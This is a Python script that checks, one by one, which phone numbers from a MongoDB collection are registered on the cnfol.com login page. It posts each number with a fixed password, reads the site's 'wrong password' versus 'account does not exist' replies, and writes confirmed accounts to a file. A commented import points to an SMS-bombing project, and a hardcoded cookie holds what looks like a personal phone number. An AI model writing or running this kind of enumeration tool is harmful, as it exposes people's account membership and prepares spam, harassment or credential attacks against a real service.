# coding:utf-8
# 中金财经
import requests, time
# from 短信轰炸.number_mongo import number_six
from number_mongo import number_BaFangZiYuan


def check_number(number):
    headers = {'Host': 'passport.cnfol.com', 'Connection': 'keep-alive', 'Content-Length': '144', 'Pragma': 'no-cache',
               'Cache-Control': 'no-cache', 'Origin': 'http://sc.stock.cnfol.com', 'Upgrade-Insecure-Requests': '1',
               'Content-Type': 'application/x-www-form-urlencoded',
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
               'Referer': 'http://sc.stock.cnfol.com/gushizhibo/20180625/26594836.shtml',
               'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'zh-CN,zh;q=0.9',
               'Cookie': 'Hm_lvt_c378c4854ec370c1c8438f72e19b7170=1529898972; CnlIds=152989897331010577; __jsluid=e4efe06042550130188309dd563b5033; cookie[passport][tmpuser]=18505615375; Hm_lpvt_c378c4854ec370c1c8438f72e19b7170=1529899131'}
    url = "https://passport.cnfol.com/login/reglogin"
    form_data = [('username', str(number)),
                 ('password', 101010),
                 ('act', "login"),
                 ('usertype', "0"),
                 ('type', "0"),
                 ('return', "http://sc.stock.cnfol.com/gushizhibo/20180625/26594836.shtml"),
                 ]
    page = requests.post(url, headers=headers, data=form_data).text
    print(page)
    return page


def save_success_number(number):
    with open("success_财经百科.txt", "a+")as f:
        f.write(str(number) + "\n")


def save_faile_number(number):
    with open("faile_财经百科.txt", "a+")as f:
        f.write(str(number) + "\n")


if __name__ == "__main__":
    count = 0
    while True:
        with open("flag_财经百科.txt")as f:
            count = int(f.read())

            time.sleep(2)
        for res in number_BaFangZiYuan.find({'_id': count}):
            line = res["number"].replace("\n", "")
            print(line, count)
            count += 1
            result = check_number(line)
            if str(result).find("账号或密码错误") != -1:
                save_success_number(number=line)
            else:
                save_faile_number(number=line)
        with open("flag_财经百科.txt", "w")as f:
            f.write(str(count))

"""
<script>alert("您输入的帐号不存在，请确认后登录");</script><script type="text/javascript">window.location.href="http://sc.stock.cnfol.com/gushizhibo/20180625/26594836.shtml";</script>
<script>alert("账号或密码错误，请确认后登录");</script><script type="text/javascript">window.location.href="http://sc.stock.cnfol.com/gushizhibo/20180625/26594836.shtml";</script>
"""
